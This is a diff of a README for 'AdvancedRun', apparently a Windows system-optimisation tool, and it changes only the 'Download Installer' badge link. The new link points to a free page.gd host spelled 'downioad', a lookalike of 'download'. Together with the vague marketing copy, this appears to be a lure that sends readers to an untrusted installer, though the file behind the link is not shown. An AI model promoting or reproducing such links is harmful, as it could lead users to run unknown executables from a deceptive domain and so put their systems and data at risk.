@@ -2,7 +2,7 @@
 
 AdvancedRun is a comprehensive Windows desktop application designed to provide advanced system management and automation capabilities for Windows 10 and 11. Updated for 2026, this tool offers a range of features to help users optimize their system performance with ease. Whether you're a tech enthusiast or a professional, AdvancedRun streamlines complex tasks into simple actions.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
